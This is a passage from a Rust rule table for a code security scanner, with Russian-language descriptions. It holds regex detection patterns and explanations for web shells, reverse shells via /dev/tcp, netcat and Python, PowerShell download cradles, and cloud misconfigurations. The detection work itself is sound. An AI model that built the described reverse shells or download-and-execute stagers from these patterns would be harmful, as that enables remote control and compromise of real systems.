        unless_contains: &[],
        cwe: &["CWE-94", "CWE-78"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://owasp.org/www-community/attacks/Web_Shell"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PH-012",
        title: "Веб-шелл: вызов функции по имени из запроса",
        description: "$_GET['x']($_GET['y']) вызывает любую функцию PHP с любыми аргументами из запроса. Это диспетчер веб-шелла, замаскированный под безобидную индексацию массива.",
        recommendation: "Удалите файл и считайте сервер скомпрометированным. Динамический вызов функции из ввода недопустим.",
        severity: Severity::Critical,
        confidence: Confidence::High,
        category: "Индикатор компрометации",
        languages: &[Language::Php],
        pattern: r#"\$_(?:GET|POST|REQUEST|COOKIE)\s*\[[^\]]+\]\s*\("#,
        unless_contains: &[],
        cwe: &["CWE-94"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://owasp.org/www-community/attacks/Web_Shell"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PH-013",
        title: "Обфусцированный eval (упакованный веб-шелл)",
        description: "eval поверх base64_decode/gzinflate/str_rot13 распаковывает и исполняет спрятанный код. Так пакуют веб-шеллы, чтобы пройти мимо беглого взгляда и простых сигнатур.",
        recommendation: "Удалите файл и считайте сервер скомпрометированным. Легитимный код не прячет исполняемое за слоями декодирования.",
        severity: Severity::Critical,
        confidence: Confidence::High,
        category: "Индикатор компрометации",
        languages: &[Language::Php],
        pattern: r#"(?i)\b(?:eval|assert)\s*\(\s*(?:gzinflate|gzuncompress|gzdecode|str_rot13|base64_decode|convert_uudecode|hex2bin|rawurldecode)\s*\("#,
        unless_contains: &[],
        cwe: &["CWE-94"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://owasp.org/www-community/attacks/Web_Shell"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-SH-003",
        title: "Реверс-шелл через /dev/tcp",
        description: "Перенаправление в /dev/tcp/host/port открывает bash обратное соединение на машину атакующего. Это канонический однострочный реверс-шелл.",
        recommendation: "Немедленно разберитесь, откуда это в коде: реверс-шелл в репозитории — признак взлома или злонамеренной вставки.",
        severity: Severity::Critical,
        confidence: Confidence::High,
        category: "Индикатор компрометации",
        languages: &[Language::Shell],
        pattern: r#"/dev/(?:tcp|udp)/"#,
        unless_contains: &[],
        cwe: &["CWE-506"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/506.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-SH-004",
        title: "Реверс-шелл через netcat / mkfifo",
        description: "netcat с -e или backpipe через mkfifo отдаёт интерактивную оболочку по сети. Ещё один стандартный реверс-шелл из шпаргалок пентестера.",
        recommendation: "Разберитесь, откуда это: намеренный бэкдор или чужая вставка. В обычном коде такого быть не должно.",
        severity: Severity::Critical,
        confidence: Confidence::High,
        category: "Индикатор компрометации",
        languages: &[Language::Shell],
        pattern: r#"(?i)\bn(?:c|cat)\b[^\n]*\s-[a-z]*e\b|mkfifo\b[^\n|]*\|[^\n]*\b(?:nc|ncat|/bin/(?:ba)?sh)\b"#,
        unless_contains: &[],
        cwe: &["CWE-506"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/506.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PY-027",
        title: "Реверс-шелл на Python (pty/dup2 на сокет)",
        description: "pty.spawn после подключения сокета или os.dup2 файлового дескриптора сокета на stdin/stdout — это интерактивный реверс-шелл на Python.",
        recommendation: "Разберитесь, откуда это в коде: реверс-шелл — признак взлома или злонамеренной вставки.",
        severity: Severity::Critical,
        confidence: Confidence::High,
        category: "Индикатор компрометации",
        languages: PY,
        pattern: r#"\bpty\.spawn\s*\(|\bos\.dup2\s*\(\s*\w+\.fileno\s*\(\s*\)\s*,\s*[012]\s*\)"#,
        unless_contains: &[],
        cwe: &["CWE-506"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/506.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PY-028",
        title: "Исполнение декодированного кода (упакованный пейлоад)",
        description: "exec/eval поверх base64.b64decode, bytes.fromhex, zlib.decompress или __import__ распаковывает и запускает спрятанный код — приём упаковки вредоносной нагрузки.",
        recommendation: "Проверьте, что именно исполняется: легитимный код не прячет логику за слоями декодирования. При сомнении считайте файл вредоносным.",
        severity: Severity::Critical,
        confidence: Confidence::High,
        category: "Индикатор компрометации",
        languages: PY,
        pattern: r#"(?i)\b(?:exec|eval)\s*\(\s*(?:base64\.b64decode|base64\.b32decode|codecs\.decode|bytes\.fromhex|zlib\.decompress|marshal\.loads|__import__)\s*\("#,
        unless_contains: &[],
        cwe: &["CWE-94", "CWE-506"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/94.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JS-030",
        title: "Исполнение декодированного кода (упакованный пейлоад)",
        description: "eval(atob(...)) или Function(atob(...)) распаковывает base64 и тут же исполняет — приём упаковки вредоносного JS, чтобы спрятать его от беглого просмотра.",
        recommendation: "Проверьте, что именно исполняется. eval над декодированной строкой в проде почти всегда либо обфускация, либо закладка.",
        severity: Severity::Critical,
        confidence: Confidence::High,
        category: "Индикатор компрометации",
        languages: JS_FAMILY,
        pattern: r#"(?i)\b(?:eval|Function)\s*\(\s*(?:atob|unescape|decodeURIComponent|Buffer\.from)\s*\("#,
        unless_contains: &[],
        cwe: &["CWE-94", "CWE-506"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/94.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PS-003",
        title: "PowerShell download-cradle (скачать и выполнить)",
        description: "IEX/Invoke-Expression поверх DownloadString/Invoke-WebRequest скачивает код с сети и сразу исполняет его в памяти. Это стандартный первый этап заражения на Windows.",
        recommendation: "Разберитесь, откуда это в коде. Скачивание и выполнение кода из сети в памяти — признак вредоносной активности.",
        severity: Severity::Critical,
        confidence: Confidence::High,
        category: "Индикатор компрометации",
        languages: &[Language::PowerShell],
        pattern: r#"(?i)(?:IEX|Invoke-Expression)\b[^\n]*(?:DownloadString|DownloadData|Net\.WebClient|Invoke-WebRequest|\biwr\b|\bwget\b|\bcurl\b)"#,
        unless_contains: &[],
        cwe: &["CWE-94", "CWE-506"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/94.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PS-004",
        title: "PowerShell: скрытый закодированный запуск",
        description: "-EncodedCommand с base64 (часто вместе с -WindowStyle Hidden / -NoProfile) прячет исполняемую команду от глаз и логов. Типичная упаковка вредоносного запуска.",
        recommendation: "Раскодируйте и проверьте команду. Скрытый закодированный запуск в коде — сильный признак вредоносной вставки.",
        severity: Severity::Critical,
        confidence: Confidence::Medium,
        category: "Индикатор компрометации",
        languages: &[Language::PowerShell],
        pattern: r#"(?i)-e(?:nc|ncodedcommand)?\s+["']?[A-Za-z0-9+/]{40,}={0,2}|-w(?:indowstyle)?\s+hidden\b[^\n]*-e"#,
        unless_contains: &[],
        cwe: &["CWE-506"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/506.html"],
        skip_in_tests: false,
    },

    // ---------------------------------------------- Проглоченные ошибки
    // Not a vulnerability on their own, but a security check that raises and is
    // silently swallowed fails open — the code proceeds as if nothing went wrong.
    // Low severity; the value is making the silence visible.
    Rule {
        id: "VS-PY-029",
        title: "Пустой except: исключение проглатывается",
        description: "except с одним pass гасит любую ошибку без следа. Если так подавлена проверка прав или валидация, сбой пройдёт незаметно, и код продолжит работу как ни в чём не бывало.",
        recommendation: "Ловите конкретный тип исключения и хотя бы логируйте его. Пустой except почти всегда прячет проблему, а не решает её.",
        severity: Severity::Low,
        confidence: Confidence::Medium,
        category: "Обработка ошибок",
        languages: PY,
        pattern: r#"(?m)^\s*except\b[^:\n]*:\s*pass\b"#,
        unless_contains: &[],
        cwe: &["CWE-703"],
        owasp: Some(OWASP_DESIGN),
        references: &["https://cwe.mitre.org/data/definitions/703.html"],
        skip_in_tests: true,
    },
    Rule {
        id: "VS-JS-031",
        title: "Пустой catch: ошибка проглатывается",
        description: "Пустой блок catch гасит исключение без следа. Упавшая проверка или сетевой сбой пройдут незаметно, и выполнение продолжится с неполными данными.",
        recommendation: "Обработайте ошибку или хотя бы залогируйте её. Пустой catch превращает сбой в тихий баг.",
        severity: Severity::Low,
        confidence: Confidence::Medium,
        category: "Обработка ошибок",
        languages: JS_FAMILY,
        pattern: r#"catch\s*(?:\([^)]*\))?\s*\{\s*\}"#,
        unless_contains: &[],
        cwe: &["CWE-703"],
        owasp: Some(OWASP_DESIGN),
        references: &["https://cwe.mitre.org/data/definitions/703.html"],
        skip_in_tests: true,
    },
    Rule {
        id: "VS-JV-013",
        title: "Пустой catch: исключение проглатывается",
        description: "Пустой блок catch гасит исключение молча. Сбой проверки или операции пройдёт незамеченным, а код продолжит работу с неопределённым состоянием.",
        recommendation: "Обработайте или прокиньте исключение и залогируйте его. Пустой catch скрывает проблему вместо её решения.",
        severity: Severity::Low,
        confidence: Confidence::Medium,
        category: "Обработка ошибок",
        languages: &[Language::Java, Language::Kotlin],
        pattern: r#"catch\s*\([^)]*\)\s*\{\s*\}"#,
        unless_contains: &[],
        cwe: &["CWE-703"],
        owasp: Some(OWASP_DESIGN),
        references: &["https://cwe.mitre.org/data/definitions/703.html"],
        skip_in_tests: true,
    },
    Rule {
        id: "VS-CS-009",
        title: "Пустой catch: исключение проглатывается",
        description: "Пустой блок catch гасит исключение молча. Сбой проверки или операции пройдёт незамеченным, а код продолжит работу с неопределённым состоянием.",
        recommendation: "Обработайте или прокиньте исключение и залогируйте его. Пустой catch скрывает проблему вместо её решения.",
        severity: Severity::Low,
        confidence: Confidence::Medium,
        category: "Обработка ошибок",
        languages: &[Language::CSharp],
        pattern: r#"catch\s*(?:\([^)]*\))?\s*\{\s*\}"#,
        unless_contains: &[],
        cwe: &["CWE-703"],
        owasp: Some(OWASP_DESIGN),
        references: &["https://cwe.mitre.org/data/definitions/703.html"],
        skip_in_tests: true,
    },

    // ------------------------------------------------------------------- SQL
    Rule {
        id: "VS-SQL-001",
        title: "xp_cmdshell — выполнение команды ОС",
        description: "xp_cmdshell в SQL Server запускает команды операционной системы с правами службы БД. Это прямой путь от SQL-инъекции к захвату сервера.",
        recommendation: "Держите xp_cmdshell отключённым. Для интеграций используйте отдельный сервис, а не команды ОС из БД.",
        severity: Severity::Critical,
        confidence: Confidence::High,
        category: "Выполнение кода",
        languages: &[Language::Sql],
        pattern: r"(?i)\bxp_cmdshell\b",
        unless_contains: &[],
        cwe: &["CWE-78"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/78.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-SQL-002",
        title: "GRANT ALL — избыточные привилегии",
        description: "GRANT ALL PRIVILEGES выдаёт учётной записи полный набор прав. Компрометация такого аккаунта означает полный контроль над базой.",
        recommendation: "Выдавайте только нужные права (SELECT/INSERT/UPDATE) на конкретные объекты — принцип наименьших привилегий.",
        severity: Severity::Medium,
        confidence: Confidence::Medium,
        category: "Контроль доступа",
        languages: &[Language::Sql],
        pattern: r"(?i)\bGRANT\s+ALL\b",
        unless_contains: &[],
        cwe: &["CWE-732"],
        owasp: Some(OWASP_ACCESS),
        references: &["https://cwe.mitre.org/data/definitions/732.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-SQL-003",
        title: "Пароль в открытом виде в SQL",
        description: "IDENTIFIED BY / PASSWORD со строковым литералом сохраняет пароль в тексте миграции и в истории репозитория.",
        recommendation: "Заводите учётные записи вне версионируемых миграций или подставляйте пароль из секрет-хранилища при развёртывании.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Хранение секретов",
        languages: &[Language::Sql],
        pattern: r#"(?i)(?:IDENTIFIED\s+BY|PASSWORD)\s+'[^']+'"#,
        unless_contains: &[],
        cwe: &["CWE-798"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/798.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-SQL-004",
        title: "Чтение или запись файла из SQL",
        description: "INTO OUTFILE/DUMPFILE и LOAD_FILE в MySQL пишут и читают файлы на сервере БД. В связке с инъекцией это ведёт к раскрытию данных и загрузке веб-шелла.",
        recommendation: "Отзовите привилегию FILE у прикладных учёток и не используйте файловые операции в запросах приложения.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Работа с файлами",
        languages: &[Language::Sql],
        pattern: r"(?i)\bINTO\s+(?:OUT|DUMP)FILE\b|\bLOAD_FILE\s*\(",
        unless_contains: &[],
        cwe: &["CWE-73"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/73.html"],
        skip_in_tests: false,
    },

    // ------------------------------------------------------------- Terraform
    Rule {
        id: "VS-TF-001",
        title: "Ресурс открыт всему интернету",
        description: "0.0.0.0/0 в правиле безопасности открывает порт для всего интернета. Для SSH, RDP или БД это прямой путь к перебору и эксплуатации.",
        recommendation: "Ограничьте cidr_blocks конкретными подсетями. Для админ-доступа используйте VPN или bastion.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Конфигурация",
        languages: &[Language::Terraform],
        pattern: r#"cidr_blocks\s*=\s*\[\s*["']0\.0\.0\.0/0["']"#,
        unless_contains: &[],
        cwe: &["CWE-284"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://cwe.mitre.org/data/definitions/284.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-TF-002",
        title: "Публичный доступ к бакету",
        description: "acl = \"public-read\" делает содержимое бакета доступным любому. Это самая частая причина утечек данных в облаках.",
        recommendation: "Используйте private ACL и выдавайте доступ через presigned URL или CloudFront с OAI.",
        severity: Severity::Critical,
        confidence: Confidence::High,
        category: "Конфигурация",
        languages: &[Language::Terraform],
        pattern: r#"acl\s*=\s*["']public-(?:read|read-write)["']"#,
        unless_contains: &[],
        cwe: &["CWE-284"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://cwe.mitre.org/data/definitions/284.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-TF-003",
        title: "Шифрование отключено",
        description: "Явное отключение шифрования оставляет данные в хранилище в открытом виде.",
        recommendation: "Включите шифрование: encrypted = true, а для управляемых ключей укажите kms_key_id.",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Криптография",
        languages: &[Language::Terraform],
        pattern: r"(?:encrypted|encryption_enabled|storage_encrypted)\s*=\s*false",
        unless_contains: &[],
        cwe: &["CWE-311"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/311.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-TF-004",
        title: "Секрет в открытом виде в конфигурации",
        description: "Пароли и ключи в .tf попадают в репозиторий и в state-файл. Terraform state хранит их без шифрования.",
        recommendation: "Используйте переменные с sensitive = true и подставляйте значения из Vault, AWS Secrets Manager или переменных окружения.",
        severity: Severity::High,
        confidence: Confidence::Low,
        category: "Секрет в коде",
        languages: &[Language::Terraform],
        pattern: r#"(?i)(?:password|secret_key|access_key|private_key)\s*=\s*["'][^"'$][^"']{7,}["']"#,
        unless_contains: &["var.", "data.", "local.", "random_"],
        cwe: &["CWE-798"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/798.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-TF-005",
        title: "IAM-политика с действием \"*\"",
        description: "Action = \"*\" (часто вместе с Resource \"*\") даёт полный доступ ко всем операциям сервиса. Скомпрометированный принципал получает права администратора.",
        recommendation: "Перечислите только нужные действия и ограничьте Resource конкретными ARN — принцип наименьших привилегий.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Контроль доступа",
        languages: &[Language::Terraform],
        pattern: r#"(?i)(?:"Action"|actions)\s*[:=]\s*\[?\s*["']\*["']"#,
        unless_contains: &[],
        cwe: &["CWE-732"],
        owasp: Some(OWASP_ACCESS),
        references: &["https://cwe.mitre.org/data/definitions/732.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-TF-006",
        title: "База данных доступна из интернета",
        description: "publicly_accessible = true выдаёт инстансу БД публичный адрес. В связке с открытой security group это выставляет базу наружу.",
        recommendation: "Задайте publicly_accessible = false и держите БД в приватной подсети, доступной только из приложения.",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Конфигурация",
        languages: &[Language::Terraform],
        pattern: r"(?mi)publicly_accessible\s*=\s*true",
        unless_contains: &[],
        cwe: &["CWE-668"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://cwe.mitre.org/data/definitions/668.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-TF-007",
        title: "Разрешён IMDSv1 (метаданные без токена)",
        description: "http_tokens = \"optional\" оставляет доступным IMDSv1. При SSRF на инстансе это позволяет украсть временные креды роли через сервис метаданных.",
        recommendation: "Требуйте IMDSv2: в metadata_options задайте http_tokens = \"required\".",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Конфигурация",
        languages: &[Language::Terraform],
        pattern: r#"(?mi)http_tokens\s*=\s*"optional""#,
        unless_contains: &[],
        cwe: &["CWE-16"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-TF-008",
        title: "S3: снята блокировка публичного доступа",
        description: "block_public_acls/ignore_public_acls/restrict_public_buckets = false отключают защиту от случайной публикации бакета. Одна публичная ACL или политика — и содержимое доступно всему интернету.",
        recommendation: "Держите все четыре флага aws_s3_bucket_public_access_block в true, если бакет не обязан быть публичным.",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Контроль доступа",
        languages: &[Language::Terraform],
        pattern: r"(?:block_public_acls|ignore_public_acls|restrict_public_buckets|block_public_policy)\s*=\s*false",
        unless_contains: &[],
        cwe: &["CWE-284"],
        owasp: Some(OWASP_ACCESS),
        references: &["https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-TF-009",
        title: "RDS: резервные копии отключены",
        description: "backup_retention_period = 0 выключает автоматические бэкапы БД. При сбое, атаке шифровальщика или ошибочном DROP восстанавливать будет нечего.",
        recommendation: "Задайте разумный срок хранения (например, backup_retention_period = 7) и проверяйте восстановление.",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Конфигурация",
        languages: &[Language::Terraform],
        pattern: r"backup_retention_period\s*=\s*0\b",
        unless_contains: &[],
        cwe: &["CWE-1188"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER_WorkingWithAutomatedBackups.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-TF-010",
        title: "Инстансу назначается публичный IP",
        description: "associate_public_ip_address = true выставляет инстанс напрямую в интернет. Любая открытая служба на нём становится доступна снаружи, минуя внутреннюю сеть.",
        recommendation: "Держите рабочие нагрузки в приватных подсетях за NAT/балансировщиком; публичный IP давайте только явным точкам входа.",
        severity: Severity::Medium,
        confidence: Confidence::Medium,
        category: "Конфигурация",
        languages: &[Language::Terraform],
        pattern: r"associate_public_ip_address\s*=\s*true",
        unless_contains: &[],
        cwe: &["CWE-668"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://cwe.mitre.org/data/definitions/668.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-TF-011",
        title: "KMS: ротация ключа отключена",
        description: "enable_key_rotation = false оставляет ключ шифрования неизменным навсегда. Чем дольше живёт ключ, тем больше данных он защищает и тем тяжелее последствия его компрометации.",
        recommendation: "Включите enable_key_rotation = true для CMK — AWS будет менять криптоматериал ежегодно автоматически.",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Криптография",
        languages: &[Language::Terraform],
        pattern: r"enable_key_rotation\s*=\s*false",
        unless_contains: &[],
        cwe: &["CWE-320"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://docs.aws.amazon.com/kms/latest/developerguide/rotate-keys.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-TF-012",
        title: "CloudTrail: журналирование урезано",
        description: "is_multi_region_trail = false или enable_logging = false оставляют аудит-события без записи. Действия атакующего в других регионах или после отключения трейла не попадут в лог.",
        recommendation: "Включите enable_logging = true и is_multi_region_trail = true, а логи защитите от изменения.",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Конфигурация",
        languages: &[Language::Terraform],
        pattern: r"(?:is_multi_region_trail|enable_logging)\s*=\s*false",
        unless_contains: &[],
        cwe: &["CWE-778"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-concepts.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-TF-013",
        title: "Политика доступна анонимно (Principal \"*\")",
        description: "\"Principal\": \"*\" (или {\"AWS\": \"*\"}) в ресурсной политике разрешает действие всем, включая анонимных пользователей. Это типовая причина утечки S3-бакетов и открытых очередей.",
        recommendation: "Укажите конкретные ARN доверенных аккаунтов или ролей вместо \"*\".",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Контроль доступа",
        languages: &[Language::Terraform],
        pattern: r#"(?i)"Principal"\s*:\s*(?:"\*"|\{\s*"AWS"\s*:\s*"\*")"#,
        unless_contains: &[],
        cwe: &["CWE-284"],
        owasp: Some(OWASP_ACCESS),
        references: &["https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_elements_principal.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-TF-014",
        title: "CloudFront допускает незашифрованный HTTP",
        description: "viewer_protocol_policy = \"allow-all\" позволяет клиентам ходить по HTTP. Трафик и куки идут открытым текстом и доступны для перехвата и подмены.",
        recommendation: "Задайте viewer_protocol_policy = \"redirect-to-https\" или \"https-only\".",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Транспортная безопасность",
        languages: &[Language::Terraform],
        pattern: r#"viewer_protocol_policy\s*=\s*"allow-all""#,
        unless_contains: &[],
        cwe: &["CWE-319"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/using-https-viewers-to-cloudfront.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-TF-015",
        title: "Разрешён устаревший TLS (1.0/1.1)",
        description: "min_tls_version = TLS1_0/TLS1_1 позволяет клиентам согласовать давно скомпрометированные версии протокола. Их следует отключать на стороне сервиса.",
        recommendation: "Поднимите минимум до TLS 1.2 (min_tls_version = \"TLS1_2\").",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Транспортная безопасность",
        languages: &[Language::Terraform],
        pattern: r#"min_tls_version\s*=\s*"(?:TLS1_0|TLS1_1|1\.0|1\.1)""#,
        unless_contains: &[],
        cwe: &["CWE-326"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/326.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-TF-016",
        title: "Azure: публичный доступ к блобам включён",
        description: "allow_blob_public_access/allow_nested_items_to_be_public = true разрешает анонимное чтение контейнеров и блобов. Это частая причина утечек данных из Azure Storage.",
        recommendation: "Держите allow_nested_items_to_be_public = false и выдавайте доступ через SAS-токены или приватные эндпойнты.",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Контроль доступа",
        languages: &[Language::Terraform],
        pattern: r"(?:allow_blob_public_access|allow_nested_items_to_be_public)\s*=\s*true",
        unless_contains: &[],
        cwe: &["CWE-284"],
        owasp: Some(OWASP_ACCESS),
        references: &["https://learn.microsoft.com/azure/storage/blobs/anonymous-read-access-prevent"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-TF-017",
        title: "Azure: разрешён незашифрованный HTTP к хранилищу",
        description: "enable_https_traffic_only = false позволяет обращаться к Storage по HTTP. Данные и ключи доступа идут открытым текстом.",
        recommendation: "Установите enable_https_traffic_only = true (в новых версиях провайдера — https_traffic_only_enabled).",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Транспортная безопасность",
        languages: &[Language::Terraform],
        pattern: r"enable_https_traffic_only\s*=\s*false",
        unless_contains: &[],
        cwe: &["CWE-319"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://learn.microsoft.com/azure/storage/common/storage-require-secure-transfer"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-TF-018",
        title: "Azure: публичный сетевой доступ к сервису",
        description: "public_network_access_enabled = true открывает управляемый сервис (БД, Key Vault, аккаунт) в публичную сеть. Поверхность атаки расширяется на весь интернет.",
        recommendation: "Отключите публичный доступ и подключайтесь через Private Endpoint/Service Endpoint.",
        severity: Severity::Medium,
        confidence: Confidence::Medium,
        category: "Конфигурация",
        languages: &[Language::Terraform],
        pattern: r"public_network_access_enabled\s*=\s*true",
        unless_contains: &[],
        cwe: &["CWE-668"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://learn.microsoft.com/azure/private-link/private-endpoint-overview"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-TF-019",
        title: "Azure Key Vault: защита от удаления выключена",
        description: "purge_protection_enabled = false позволяет безвозвратно удалить хранилище и ключи. Атакующий с доступом уничтожит криптоматериал, оставив данные нерасшифровываемыми.",
        recommendation: "Включите purge_protection_enabled = true и soft delete для Key Vault.",
        severity: Severity::Low,
        confidence: Confidence::High,
        category: "Конфигурация",
        languages: &[Language::Terraform],
        pattern: r"purge_protection_enabled\s*=\s*false",
        unless_contains: &[],
        cwe: &["CWE-693"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://learn.microsoft.com/azure/key-vault/general/soft-delete-overview"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-TF-020",
        title: "Azure NSG: правило разрешает любой источник",
        description: "source_address_prefix = \"*\" во входящем разрешающем правиле NSG открывает порт всему интернету — аналог 0.0.0.0/0. Часто так случайно выставляют RDP/SSH наружу.",
        recommendation: "Ограничьте source_address_prefix конкретными диапазонами; для управления используйте бастион/VPN.",
        severity: Severity::Medium,
        confidence: Confidence::Low,
        category: "Контроль доступа",
        languages: &[Language::Terraform],
        pattern: r#"source_address_prefix\s*=\s*"\*""#,
        unless_contains: &[],
        cwe: &["CWE-284"],
        owasp: Some(OWASP_ACCESS),
        references: &["https://learn.microsoft.com/azure/virtual-network/network-security-groups-overview"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-TF-021",
        title: "GCP: ресурс открыт для allUsers/allAuthenticatedUsers",
        description: "Привязка IAM к allUsers или allAuthenticatedUsers делает ресурс (бакет, топик, функцию) публичным. allUsers — это буквально «кто угодно из интернета».",
        recommendation: "Удалите привязку к allUsers/allAuthenticatedUsers; выдавайте роли конкретным сервис-аккаунтам и группам.",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Контроль доступа",
        languages: &[Language::Terraform],
        pattern: r#""(?:allUsers|allAuthenticatedUsers)""#,
        unless_contains: &[],
        cwe: &["CWE-284"],
        owasp: Some(OWASP_ACCESS),
        references: &["https://cloud.google.com/storage/docs/access-control/making-data-public"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-TF-022",
        title: "GCP firewall: источник 0.0.0.0/0",
        description: "source_ranges = [\"0.0.0.0/0\"] открывает правило файрвола всему интернету. В связке с разрешёнными портами администрирования это выставляет узлы наружу.",
        recommendation: "Сузьте source_ranges до нужных диапазонов; доступ к SSH/RDP давайте через IAP или бастион.",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Контроль доступа",
        languages: &[Language::Terraform],
        pattern: r#"source_ranges\s*=\s*\[\s*"0\.0\.0\.0/0""#,
        unless_contains: &[],
        cwe: &["CWE-284"],
        owasp: Some(OWASP_ACCESS),
        references: &["https://cloud.google.com/vpc/docs/firewalls"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-TF-023",
        title: "GKE: клиентский сертификат как метод входа",
        description: "issue_client_certificate = true включает статический клиентский сертификат для доступа к кластеру. Его нельзя отозвать по отдельности, и это слабый метод аутентификации.",
        recommendation: "Отключите client certificate (issue_client_certificate = false) и используйте IAM/OIDC.",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Аутентификация",
        languages: &[Language::Terraform],
        pattern: r"issue_client_certificate\s*=\s*true",
        unless_contains: &[],
        cwe: &["CWE-295"],
        owasp: Some(OWASP_AUTH),
        references: &["https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-your-cluster"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-TF-024",
        title: "GKE: экранированные узлы отключены",
        description: "enable_shielded_nodes = false отключает Shielded GKE Nodes — проверку загрузки и целостности узлов. Это ослабляет защиту от руткитов и подмены образа узла.",
        recommendation: "Включите enable_shielded_nodes = true и Secure Boot для узлов.",
        severity: Severity::Low,
        confidence: Confidence::High,
        category: "Конфигурация",
        languages: &[Language::Terraform],
        pattern: r"enable_shielded_nodes\s*=\s*false",
        unless_contains: &[],
        cwe: &["CWE-693"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://cloud.google.com/kubernetes-engine/docs/how-to/shielded-gke-nodes"],
        skip_in_tests: false,
    },

    // ------------------------------------------------------------ Kubernetes
    Rule {
        id: "VS-K8-001",
        title: "Контейнер запущен привилегированным",
        description: "privileged: true даёт контейнеру доступ ко всем устройствам хоста и снимает почти всю изоляцию. Побег из такого контейнера тривиален.",
        recommendation: "Уберите privileged. Если нужны отдельные возможности — выдайте их точечно через capabilities.add.",
